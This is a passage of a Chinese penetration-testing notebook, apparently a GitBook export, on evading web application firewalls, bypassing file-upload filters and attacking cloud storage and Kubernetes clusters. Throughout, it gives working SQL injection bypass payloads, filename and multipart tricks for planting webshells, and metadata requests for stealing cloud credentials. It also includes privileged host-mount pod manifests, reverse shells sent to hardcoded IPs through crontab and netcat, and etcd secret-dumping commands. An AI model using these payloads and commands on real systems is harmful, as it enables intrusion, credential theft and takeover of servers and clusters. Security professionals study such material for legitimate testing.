-8859-2\",\"ISO-8859-3\",\"ISO-8859-4\",\"ISO-8859-5\",\"ISO-8859-6\",\"ISO-8859-7\",\"ISO-8859-8\",\"ISO-8859-9\",\"JIS_X0201\",\"JIS_X0212-1990\",\"KOI8-R\",\"KOI8-U\",\"Shift_JIS\",\"TIS-620\",\"US-ASCII\",\"UTF-16\",\"UTF-16BE\",\"UTF-16LE\",\"UTF-32\",\"UTF-32BE\",\"UTF-32LE\",\"UTF-8\",\"windows-1250\",\"windows-1251\",\"windows-1252\",\"windows-1253\",\"windows-1254\",\"windows-1255\",\"windows-1256\",\"windows-1257\",\"windows-1258\",\"windows-31j\",\"x-Big5-HKSCS-2001\",\"x-Big5-Solaris\",\"x-COMPOUND_TEXT\",\"x-euc-jp-linux\",\"x-EUC-TW\",\"x-eucJP-Open\",\"x-IBM1006\",\"x-IBM1025\",\"x-IBM1046\",\"x-IBM1097\",\"x-IBM1098\",\"x-IBM1112\",\"x-IBM1122\",\"x-IBM1123\",\"x-IBM1124\",\"x-IBM1166\",\"x-IBM1364\",\"x-IBM1381\",\"x-IBM1383\",\"x-IBM300\",\"x-IBM33722\",\"x-IBM737\",\"x-IBM833\",\"x-IBM834\",\"x-IBM856\",\"x-IBM874\",\"x-IBM875\",\"x-IBM921\",\"x-IBM922\",\"x-IBM930\",\"x-IBM933\",\"x-IBM935\",\"x-IBM937\",\"x-IBM939\",\"x-IBM942\",\"x-IBM942C\",\"x-IBM943\",\"x-IBM943C\",\"x-IBM948\",\"x-IBM949\",\"x-IBM949C\",\"x-IBM950\",\"x-IBM964\",\"x-IBM970\",\"x-ISCII91\",\"x-ISO-2022-CN-CNS\",\"x-ISO-2022-CN-GB\",\"x-iso-8859-11\",\"x-JIS0208\",\"x-JISAutoDetect\",\"x-Johab\",\"x-MacArabic\",\"x-MacCentralEurope\",\"x-MacCroatian\",\"x-MacCyrillic\",\"x-MacDingbat\",\"x-MacGreek\",\"x-MacHebrew\",\"x-MacIceland\",\"x-MacRoman\",\"x-MacRomania\",\"x-MacSymbol\",\"x-MacThai\",\"x-MacTurkish\",\"x-MacUkraine\",\"x-MS932_0213\",\"x-MS950-HKSCS\",\"x-MS950-HKSCS-XP\",\"x-mswin-936\",\"x-PCK\",\"x-SJIS_0213\",\"x-UTF-16LE-BOM\",\"X-UTF-32BE-BOM\",\"X-UTF-32LE-BOM\",\"x-windows-50220\",\"x-windows-50221\",\"x-windows-874\",\"x-windows-949\",\"x-windows-950\",\"x-windows-iso2022jp\"} 多数据来源 web应用程序从多个地方取值，如 # php $param = $_SERVER['xxxx'] 可以从GET,POST,HEADER,METHOD等地方获取用户提交的参数。 如果waf只对GET，POST进行检测,没有与后端相适应，就可以绕过。 HTTP协议 分块传输 Burp插件：https://github.com/c0ny1/chunked-coding-converter Transfer-Encoding: chunked # 表示BODY的传输编码方式为chunked（无Content-Length字段） 3 # 指明传输的数据长度 a=1 0 # 表示传输结束 keep-alive http长连接，发送多个数据包请求，感觉跟请求走私很像 Connection: Keep-Alive 需要关闭 multipart/form-data Multipart所以使用请求与普通的GET/POST参数传输有非常大的区别，因为Multipart请求需要后端Web应用解析该请求包，Web容器也不会解析Multipart请求。WAF可能会解析Multipart但是很多时候可以直接绕过，比如很多WAF无法处理一个数据量较大的Multipart请求或者解析Multipart时不标准导致绕过。 更多关于multipart/form-data的绕过思路：月影斑驳--do9gy's blog (moonslow.com) chrest编码 content-type: charest=cp037 ibm869 ibm870 ibm871 ibm918 iso-2022-cn iso-2022-jp iso-2022-jp-2 iso-2022-kr iso-8859-1 iso-8859-13 iso-8859-15 脚本 import urllib.parse payload = 'alert(\"xss\")' print(urllib.parse.quote_plus(payload.encode(\"IBM037\" ))) Accept-Encoding: Accept-Encoding: gzip Accept-Encoding: compress Accept-Encoding: deflate Accept-Encoding: br Accept-Encoding: identity Accept-Encoding: * waf特性 部署方式，策略与规则缺陷 云waf 通过CNAME接入将网站域名添加到WAF后，网站所有的业务流量将被引流到WAF进行检测。WAF过滤Web应用攻击后，将正常的业务流量转发回源站服务器，从而保障网站的业务安全和数据安全。此时，WAF作为一个反向代理集群，同时参与流量的检测和转发。 所以如果可以找到目标的真实ip，就可以绕过云waf。 像下面这样的是不行的 云wafPing出来是这种的hlpqjurlppnsnvzs72xcfxxxxx7htyxpit3c39.yundunwaf3.com 虽然也有真实IP，但是域名走的waf解析，不允许IP直接访问 性能缺陷 脏数据 为了防止消耗太多的CPU、内存资源，因此许多WAF只检测前面的2M或4M的内容。所以可以通过填充垃圾数据进行绕过。 静态文件绕过 一些 WAF 为了减少服务器的压力，会对静态文件如.png、.css等直接放行，那么我们可以尝试伪装成静态文件来绕过 # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?1.jpg&id=123 and 2*3=6 高并发 用Burp的Trubo Intruder插件,失败 而且高并发很可能会造成业务系统出现问题。 一个成功的案例https://zone.huoxian.cn/d/113 白名单机制 文件白名单 一些 WAF 为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 如：WAF 设立了白名单/admin，那么我们的测试 payload 可以通过如下的手法来绕过 # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?a=/admin&id=123 and 2*3=6 IP白名单 后端通过Header字段获取源IP X-FORWARDED-FOR等 UA白名单 某些WAF可能为了不影响站点的SEO优化，将User-Agent为某些搜索引擎（如谷歌）的请求当作白名单处理，不检测和拦截。 # 百度搜索老版UA Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html) # 百度图片老版UA Baiduspider-image+(+http://www.baidu.com/search/spider.htm) # 新版PC Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html) # 新版WAP Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html) # 360搜索 Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); # 360网站安全检测 360spider (http://webscan.360.cn) # Google Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) # Adwords移动网络 Googlebot-Image/1.0 # Adwords移动网络 AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari # 微软 bing，必应 Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) # 搜狗搜索 Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07) 请求方式 一些 WAF 对于get请求和post请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些 WAF 检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 正面硬刚类 增增改改混淆视听，使waf的规则和策略失效 基本方针： 增删测试waf容忍度，确认关键点 FUZZ PAYLOAD,先保证可以绕过检测 再次进行构造使得后端能够进行解析 FUZZ大法 fuzz大法，使用脚本去探测WAF设备对于字符处理是否有异常，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass 测试点 1）：get请求处 2）：header请求处 3）：post urlencode内容处 4）：post form-data内容处 基础内容 1）编码过的0-255字符 2）进行编码的0-255字符 3）utf gbk字符 实验环境--安全🐕 没有在代码中进行过滤，如有会说明。 win 10 php 5.6.9 mysql 5.7.26 apache 2.4.39 safe dog V3.5 配置如下，除了CC攻击，全防护 特征 sql注入绕过 多参数来源实验 $_REQUEST['id'] 失败 $_POST['id'] 成功 脏数据实验 POST id=1 union select 1,2,3%23 安全🐕在HTTP BODY中检测到了关键字，直接返回500。。 POST a=8172*A&id=-1 union select 1,2,3%23 注意 waf可能直接检测长度来拦截 如安全🐕,GET下是不行的 分块传输实验 成功，图没截。。 正面绕过 简单fuzz 可以发现不会对单一的关键字进行过滤，会对一些组合进行过滤 union select绕过 union (select) UNiOn/*/1/*/select UNiOn--+%02%0d%0aselect #注释换行 ?id=-1 UNiOn/**/select 1,2,3# ?id=-1 UNiOn/*/1/*/select 1,2,3# 在/**/中插入/x/即可，x至少为一个字符 函数绕过 ?id=-1 union/*/1/*/select 1,2,database()--+ ?id=-1 union/*/1/*/select 1,2,database/**/()--+ FUZZ结果 select from 硬刚G 分块传输，脏数据等成功 文件上传绕过 waf检测内容 请求的url Boundary边界 MIME类型 文件后缀名 文件头 文件内容 访问流量 文件上传数据包了解 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl ------WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\" Content-Type: image/png ------WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Disposition: form-data; name=\"submit\" submit ------WebKitFormBoundary9zWBDx6vAJHGTpAl-- boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl 定义了BODY中的分界线(因为是谷歌浏览器，所以分界线为----WebKitFormBoundary加上随机字符串) --boundary # 开始标志 Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\" Content-Type: image/png 文件内容 --boundary # 每两个分界线之间是具体的内容：文件上传，post传参 Content-Disposition: form-data; name=\"submit\" POST内容 --boundary-- # 结束标志 文件上传绕过手法 绕过后缀 Content-Type Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Type: multipart/XXXXXX; boundary=----WebKxxxxx Content-Type: multipart/; boundary=----WebKxxxxx 增加多个boundary php：可以在boundary前后添加任意字符 大小写 boundary=boundary=a Content-Disposition Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\" 大小写 # Content-Disposition Content-Disposition 任意位置换行,空格，脏数据溢出 多个Content-Disposition form-data删除，改为* # filename 多个filename，多个; 文件名单双引号数量 filename字符左右可以加上一些空白字符%20 %09 %0a %0b %0c %0d %1c %1d %1e %1f 插入转义字符 content-type（增删，设置charset） 多个BODY 多个boundary 交换name和filename的顺序 排列组合 Windows NTFS 流 文件流 (本地文件系统) - Win32 apps | Microsoft Learn fuzz可以的 ::$DATA ::$INDEX_ALLOCATION 文件名 文件名尾加任意个. 或者任意个空格（对文件名无影响） windows文件名的保留字符（不允许出现） \\/:*?\" <>| 可以尝试在文件名后加上这些字符 当filename=shell.php:.jpg 结果： 可以上传shell.php，但是会吃掉文件内容。。。 其他的要不不可以，可以的话，上传的文件名为.jpg 文件名长度 截断超长文件名 windows文件名 linux文件名：linux中文件名最长为255字符，文件路径最大长度为4096字符 如果后端脚本没有限制上传文件名长度，可以通过多次测试，上传名为aaaaa…(200+).php.jpg，把最后的.jpg挤出去。 绕过文件内容检测--免杀 waf检测 内容、创建日期、文件大小、通信流量特征 对于静态引擎的绕过，可以通过拆分关键词、 加入能够引发解析干扰的畸形字符等; 而对于动态引擎，需要分析它跟踪了哪些输入 点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则 简单理解污点分析技术 | K0rz3n's Blog 另类的入口 各种混淆（编码加密，进制转换，反序列化...） 符号干扰，绕过正则，拼接null,\\n,\\r,\\t等 信息差绕过（加入外部因素后才是webshel，量子WEBshell😋）比如截取文件名，目录名，传入随机数种子等 传统webshell 学习： WebShell通用免杀的思考 - 腾讯云开发者社区-腾讯云 https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/ 代码审计知识星球 收集： https://github.com/tennc/webshell 绕过流量检测--特征/通信加密 弱特征：HTTP Header request和response内容 参考之前HW看的文章 哥斯拉 【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业门户 冰蝎 利用动态二进制加密实现新型一句话木马之Java篇 - 先知社区 冰蝎V4.0流量分析到攻防检测 - SecPulse.COM | 安全脉搏 冰蝎4.0自定义加密 - 先知社区 蚁剑 https://www.yuque.com/antswordproject/antsword/yuakxl 安全🐕检测内容 不允许php后缀上传 上传时，不检查文件内容 访问时，不允许访问含有恶意内容的php文件 部分成功的 后缀绕过 waf是解析最后一个参数，最后一个;后面的，但是如果最后一个；后面没有参数， 后端就取前一个,waf识别到空 filename=shell.php; filename='shell.php'; # 双引号不行 Content-Disposition: form-data; name=\"upload_file\";filename=shell.php 除了shell.php处，其他地方加换行，或脏数据都可 删除content-type 增加boundary 安全🐕+代码白名单（后缀只允许图片） 上面任意一个绕过（除了；绕过）+ filename=shell.php::$DATA.jpg 内容检测绕过 安全🐕的内容检测随便改一下就过了。 流量检测绕过 system(\"xxx\") #命令执行限制 对流量进行一个base64加密即可 webshell 蚁剑 编码器 data[pwd] = Buffer.from(data['_']).toString('base64'); 选择编码器 JAVA文件上传绕过补充 commons-fileupload组件--QP编码 org.apache.commons.fileupload对传入的值进行了MimeUtility.decodeText操作 为了符合RFC 2047规范会将 要求以=?开头 之后要求还要有一个?，中间的内容为编码，也就是=?charset? 获取下一个?间的内容，这里与下面的编解码有关 之后定位到最后一个?=间内容执行解码 例子 =?gbk?Q?=31=2e=6a=73=70?= B，Q，分别对应Base64以及Quoted-printable编码 Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”=0C”， 等号”=”（十进制值为61）必须表示为”=3D”，gb2312下“中”表示为=D6=D0 Payload boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?= 解码后 boundary=----WebKitFormBoundaryTyBDoKvamN58lcEw 解码时只会提取=??=之间的内容，所以可以在最后插入混淆字符 处理过程中还有对\\t\\r\\n的处理 可以将文件名拆分并插入\\t\\r\\n Tomcat与Spring文件上传 如果首位是\"(前提条件是里面有\\字符)，那么就会去掉\"，从第二个字符开始取值，并且末尾也会往前移动一位，同时会忽略字符\\ filename=\"y4\\.jspZ filename=\"1.txt\\\".jsp\" Content-Disposition: form-data*;;;;;;;;;;name*=\"UTF-16BE'Y4tacker'%00d%00e%00p%00l%00o%00y%00W%00a%00r\";;;;;;;;filename*=\"UTF-16BE'Y4tacker'%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K\" # Spring5支持的编码UTF-8/ISO-8859-1/US_ASCII filename*=utf8'das'1.jsp filename*=utf8\"das\"1.jsp filename*=utf8\"das\"1.jsp;sd=1 filename*=\"utf8'das'1.jsp\" filename*=\"utf8'das'1.jsp\";;;;asdsad; # 再加url编码 filename*=utf8\"das\"1.js%70;sd=1 filename=1.jsp;.txt; filename=\"1.txt\".jsp;txt; # 多个filename组合绕过 filename=\"1.txt\";filename*=\"UTF-8\"'sad'%32%2e%6a%73%70 #%32%2e%6a%73%70→2.jsp z=\"filename=\"1.jsp\"\";filename=\"1.txt\" z=\"filename=1.jsp;\";filename=\"1.txt\" Druid SQL https://www.cnblogs.com/HighnessDragonfly/p/14821624.html https://www.modb.pro/db/587040 参考文章 https://xz.aliyun.com/t/12684 我的WafBypass之道（SQL注入篇） - 先知社区 (aliyun.com) 文件上传绕过思路总结 - 先知社区 (aliyun.com) Bypass WAF Cookbook - MayIKissYou (wooyun.js.org) WAF是如何被绕过的？-安全客 - 安全资讯平台 (anquanke.com) 玄武盾的几种绕过姿势 - 先知社区 Java文件上传大杀器-绕waf(针对commons-fileupload组件) | Y4tacker's Blog/) 探寻Tomcat文件上传流量层面绕waf新姿势 | Y4tacker's Blog 探寻Java文件上传流量层面waf绕过姿势系列二 | Y4tacker's Blog Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 19:02:50 "},"01.渗透测试/02.Web安全/其他.html":{"url":"01.渗透测试/02.Web安全/其他.html","title":"其他","keywords":"","body":"二维码劫持 URL跳转 Ddos攻击漏洞 https://xz.aliyun.com/t/15258?time__1311=GqjxnD0D2GAxlhz30%3DGODRQQF%2B%2B7hDWumD#toc-2 图形验证码生成 查询条数 图片转Base64形式存储 隐私合规漏洞 需要对隐私政策进行解读，明确对方是违反了哪一条国家制定的政策 vivo隐私合规漏洞评分规则v1.0 浅析SRC中的隐私合规漏洞挖掘丨平安SRC线上沙龙第三期 - 隐私合规专场丨漏洞银行直播间_哔哩哔哩_bilibili PPT如下 水水洞 jquery版本过低 中间件版本信息泄露 点击劫持漏洞 会话固定漏洞 绝对路径信息泄露 报错信息泄露（数据库，组件信息） 数据强转 请求方法 不合法字符 多点认证缺陷 会话未注销 ip地址伪造 不安全的http方法 默认页面检测；默认管理控制台 csv注入https://www.cnblogs.com/M0urn/articles/17761207.html sourcemap还原js代码 新用户使用默认密码 会话有效时间过长 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 20:14:39 "},"01.渗透测试/03.云安全/云安全.html":{"url":"01.渗透测试/03.云安全/云安全.html","title":"云安全","keywords":"","body":" 对象存储服务--存储桶Bucket 可以关注一下静态文件是不是从其他域名引入的，一般从其他域名引入的就是从存储桶引入的。 还有一种情况是藏在多级目录下，比如/minio/picture/ Bucket 爆破 利用场景：访问时返回InvalidBucketName 原理 存储桶地址：Bucket名称-Bucket地区-云厂商 当存储桶不存在时有两种返回情况，分别是 InvalidBucketName 和 NoSuchBucket 当存储桶存在时只会根据是否可读返回存储桶中的文件 ​ 权限控制ACL配置不当 公共读（包含ListObject操作--相当于列目录） ossx-main爬取链接+wget批量下载 公共读写 PUT上传文件 Bucket Policy允许公共访问 访问/?acl，获取策略并根据策略进行请求从而访问存储桶 Bucket Policy允许修改 使用云厂商工具修改策略中的Deny为Allow即可访问存储桶 域名解析问题 文件解析问题 存储桶只用作存储，访问存储桶中的文件，文件是不解析直接下载的 但如果配置了CNAME记录 my.com → oss.com oss.com/index.php不解析直接下载 my.com/index.php会解析php 如何确定：ping my.com 解析到oss.com则证明了配置了CNAME记录 Bucket 接管 利用场景：访问时返回NoSuchBucket 类似于子域名接管，只是cname指向的是Bucket 因为域名（源域名）配置了CNAME，但是CNAME指向的域名并没有被注册。那么攻击者可以注册这个CNAME指向的域名，就可以控制了源域名。 因为域名配置了CNAME，但是CNAME指向的Bucket没有被注册（被删除了），那么攻击者可以注册这个CNAME指向的Bucket，从而接管该域名。 参考文章：记一次因为 S3 bucket 删除而导致的子域名接管(subdomain takeover)的安全问题 | Zach Ke's Notes (kebingzao.com) AK/SK泄露 接管 云服务器 角色访问控制 授权角色可以使用哪些云服务 元数据 元数据服务是一种提供查询运行中的实例内元数据的服务。 通过元数据，攻击者除了可以获得 云服务器 上的一些属性信息之外，有时还可以获得与该实例绑定角色的临时凭证，并通过该临时凭证获得云服务器的控制台权限，进而横向到其他机器。 利用场景 获取目标 云服务器 权限或者目标云服务器 存在 SSRF 漏洞 相关请求 curl http://ip/latest/meta-data // 获取临时凭证要加最后的/ curl http://ip/latest/meta-data/ram/security-credentials/ // 如果配置了访问控制角色将会列出 curl http://ip/latest/meta-data/ram/security-credentials/ecs // 获取ecs角色的临时凭证 // 其他关键信息 /latest/meta-data/mac 实例 MAC 地址 /latest/meta-data/hostname 实例主机名 /latest/meta-data/ram/info 获取角色名称 /latest/meta-data/local-ipv4 实例本地 IP /latest/meta-data/public-ipv4 实例公网 IP /latest/meta-data/instance-id 实例 ID /latest/meta-data/public-hostname 接口的公有 DNS (IPv4) /latest/meta-data/placement/region 实例的区域 /latest/meta-data/public-keys/0/openssh-key 公有密钥 /latest/meta-data/ram/security-credentials/ 获取角色的临时凭证 阿里云为RAM访问控制，AWS为iam访问控制，不同厂商的名称不同，元数据的路径也要替换 k8s--Kubernetes 基本介绍 Kubernetes（简称 k8s）是一个开源的容器管理平台，用于自动化部署、扩展和管理容器化的应用程序。 了解：https://golangguide.top/%E6%9E%B6%E6%9E%84/%E4%BA%91%E5%8E%9F%E7%94%9F/%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9/k8s%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88.html 组件介绍 Scheduler ：调度器，找到能满足 Pod 部署所需硬件资源的Node节点 控制平面（master节点）用于管理node节点 node节点是一台独立的物理机也可以是一个虚拟机，上面运行着pod和其他通信服务，pod实际上就是用docker搭建的服务。 集群（Cluster）= 控制平面（Master节点）+ 多个node节点，pod同时部署在多个node节点上（通过不同的node节点ip都可以访问到pod服务，一个pod服务挂了，其它节点上的仍可以正常使用，就相当于容灾） 部署服务 首先我们需要编写 YAML 文件，在里面定义 Pod 里用到了哪些镜像，占用多少内存和 CPU 等信息。 然后使用 kubectl 命令行工具执行 kubectl apply -f xx.yaml ，此时 kubectl 会读取和解析 YAML 文件，将解析后的对象通过 API 请求发送给 Kubernetes 控制平面内 的 API Server。 API Server 会根据要求，驱使 Scheduler 通过 etcd 提供的数据寻找合适的 Node， Controller Manager 会通过 API Server 控制 Node 创建服务，Node 内部的 kubelet 在收到命令后会开始基于 Container runtime 组件去拉取镜像创建容器，最终完成 Pod 的创建。 外部请求处理 以前外部用户小明，直接在浏览器上发送 http 请求，就能打到我们服务器上的 Nginx，然后转发到部署的服务内。 用了 k8s 之后，外部请求会先到达 k8s 集群的 Ingress 控制器，然后请求会被转发到 k8s 内部的某个 Node 的 Kube Proxy 上，再找到对应的 pod，然后才是转发到内部容器服务中，处理结果原路返回，到这就完成了一次服务调用。 指纹识别 Node节点 组件名称 默认端口 kubelet 10250/10255 dashboard 8001 kube-proxy 8001 docker 2375 Master节点 组件名称 默认端口 api server 6443、8080 dashboard 8001 etcd 2379 kube-scheduler 10251 kube-controller-manager 10252 Dashboard未授权访问 利用场景 配置文件recommended.yaml中开启enable-skip-login，并且给Kubernetes dashboard绑定cluster-admin等角色，攻击者可直接在界面上创建特权pod进行容器逃逸 漏洞利用 点击dashboard右上角的加号创建pod并挂在宿主机的根目录 apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / 这里将宿主机的目录挂在到了/mnt目录下 可以通过写crontab获取shell echo -e \"* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1\" >> /mnt/etc/crontab 或者通过chroot来获取终端 K8s configfile 泄露 K8s configfile作为K8s集群的管理凭证，其中包含有关K8s集群的详细信息（API Server、登录凭证）。 如果攻击者能够访问到此文件(如办公网员工机器入侵、泄露到 Github 的代码等)，就可以直接通过 API Server 接管 K8s 集群，带来风险隐患。 用户凭证保存在 kubeconfig 文件中，kubectl 通过以下顺序来找到 kubeconfig 文件： 如果提供了--kubeconfig参数，就使用提供的 kubeconfig 文件。 如果没有提供--kubeconfig 参数，但设置了环境变量 $KUBECONFIG，则使用该环境变量提供的 kubeconfig 文件。 如果以上两种情况都没有，kubectl 就使用默认的 kubeconfig 文件 $HOME/.kube/config。 漏洞利用 通过Dashboard的配置文件方式登录 使用kubectl # 连接 kubectl -s https://ip:6443 --kubeconfig=config1 -insecure-skip-tls-verify=true get nodes # 创建恶意pod kubectl apply -f test.yaml -n default --kubeconfig=config1 --insecure-skip-tls-verify=true #连接 pod 后进行容器挂载逃逸 kubectl exec -it myapp bash -n default --kubeconfig=config1 cd /mnt chroot . bash # test.yaml apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: nginx name: myapp volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / Master节点攻击 API Server 未授权访问 利用场景 旧版本的k8s的API Server默认会开启两个端口：8080和6443。 6443是安全端口，安全端口使用TLS加密；8080端口无需认证http访问，仅用于测试。高版本的k8s已经默认不开启8080端口 8080端口--k8s 新版本需要修改配置文件 /etc/kubernetes/manifests/kube-apiserver.yaml 默认端口8080，修改标识–insecure-port 默认IP是本地主机，修改标识—insecure-bind-address 6443端口 鉴权配置不当，将\"system:anonymous\"用户绑定到\"cluster-admin\"用户组，从而使 6443端口允许匿名用户以管理员权限向集群内部下发指令。 kubectl-proxy不安全配置 对方运维使用命令kubectl proxy设置API server接收所有主机的请求 # 相当于8009端口API Server未授权访问 kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009 漏洞存在时 漏洞利用 通过kubectl命令攻击 # 查询nodes和pods kubectl -s http://ip:6443/ get nodes kubectl -s http://ip:6443/ get pods kubectl -s ip:6443 get pod -n [node] # 创建恶意pods kubectl -s http://ip:6443/ create -f test.yaml test.yaml apiVersion: v1 kind: Pod metadata: name: test spec: containers: - name: busybox image: busybox:1.29.2 command: [\"/bin/sh\"] args: [\"-c\", \"nc 192.168.125.130 7777 -e /bin/sh\"] volumeMounts: - name: host mountPath: /host volumes: - name: host hostPath: path: / type: Directory 获得pod的shell kubectl -s http://ip:6443/ get namespaces kubectl exec -it -n bash 通过http请求攻击 #查看pods https://192.168.4.110:6443/api/v1/namespaces/default/pods?limit=500 #创建特权容器 https://192.168.4.110:6443/api/v1/namespaces/default/pods/test-4444 {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"test-4444\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"image\\\":\\\"nginx:1.14.2\\\",\\\"name\\\":\\\"test-4444\\\",\\\"volumeMounts\\\":[{\\\"mountPath\\\":\\\"/host\\\",\\\"name\\\":\\\"host\\\"}]}],\\\"volumes\\\":[{\\\"hostPath\\\":{\\\"path\\\":\\\"/\\\",\\\"type\\\":\\\"Directory\\\"},\\\"name\\\":\\\"host\\\"}]}}\\n\"},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}} #执行命令 https://192.168.4.110:6443/api/v1/namespace/default/pods/test-4444/exec?command=whoami # 获取token /api/v1/namespaces/kube-system/secrets/ etcd未授权访问 利用场景 配置文件： /etc/kubernetes/manifests/etcd.yaml etcd服务有V2和V3两个版本 k8s默认配置下etcd服务只会监听本地的2379端口 没有配置--client-cert-auth 参数（无证书校验），外部可以直接未授权访问获取secrets和token来接管API Server 配置--client-cert-auth 参数（有证书校验），本地127.0.0.1:2379可免认证访问Etcd服务，但通过其他地址访问要携带cert进行认证访问，一般配合ssrf或其他利用，较为鸡肋。 漏洞利用 访问 http://ip:2379/v2/keys/?recursive=true V2版本返回所有的key-value值 V3版本返回如下 需要使用工具：https://etcd.io/docs/v3.4/install/ # 获取k8s的secrets ./etcdctl --endpoints=https://ip:2379 get / --prefix --keys-only | grep sceret # 获取用户指定token ./etcdctl --endpoints=https://ip:2379 get /registry/secrets/xxxx/xxx ./etcdctl --endpoints=https://ip:2379 get /registry/secrets/kube-system/xxx # 通过token接管 kubectl --insecure-skip-tls-verify-s https://ip:6443 --token=\"ey...\" -n kube-system get pods 污点横向移动 基本原理 通过外网获得了一个pod权限，此时我们的目标就是获得Master节点的宿主机权限，那我们应该怎么做呢？ 可以想到获得Master节点的pod权限，再通过逃逸或者挂载获得Master节点的宿主机权限，那么就是需要部署一个恶意pod到Master节点上。 如何获得部署一个恶意pod的权限呢？ Api Server/etcd未授权访问 不同Node节点上的pod服务中的ServiceAccount 权限 # 确认当前默认 service-account权限 ./kubectl auth can-i --list 信息收集得到config配置文件 假设已经获得部署一个恶意pod的权限，还有一个问题就是默认pod是不会被部署到Master节点上的，这是因为Master节点具有污点属性，只有具备对应容忍度的pod才可以被部署到Master节点，解决方法就是清除Master节点的污点或者部署pod时加上对应容忍度属性 横向移动 以下为在pod服务的webshell上进行Api Server未授权访问操作 部署pod时加上对应容忍度属性 # --username=a --password=a 因为webshell不是交互式终端，不加的话会让你输入用户名这样是行不通的 ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a # 获取pod的污点信息 ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a describe nodes | grep Taints # 部署pod到Master节点，可能需要修改容器名字多尝试几次,调度问题？ ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a create -f ./x.yaml # 获取pod信息以及pod部署到哪个节点 get pods -o wide ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a get pods -o wide # 反弹shell获取Master节点的宿主机权限 ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a exec control-master-x231 -- bash -c \"echo -e '* * * * * root bash -i >& /dev/tcp/192.168.86.218/6677 0>&1\\\\n' >> /master/etc/crontab\" x.yaml cat > x.yaml nodeName 是 Pod 的一个字段，用于直接指定 Pod 要运行的节点。 apiVersion: v1 kind: Pod metadata: name: my-pod spec: containers: - name: my-container image: nginx nodeName: node-name # 替换为目标节点的名称 清除Master节点的污点？ 执行以下命令清除污点之后直接执行部署Pod到Master上，之后通过挂载实现逃逸获取Master节点的权限 #清除污点 kubectl taint nodes debian node-role.kubernetes.io/master:NoSchedule- #查看污点 kubectl describe node master | grep 'Taints' -A 5 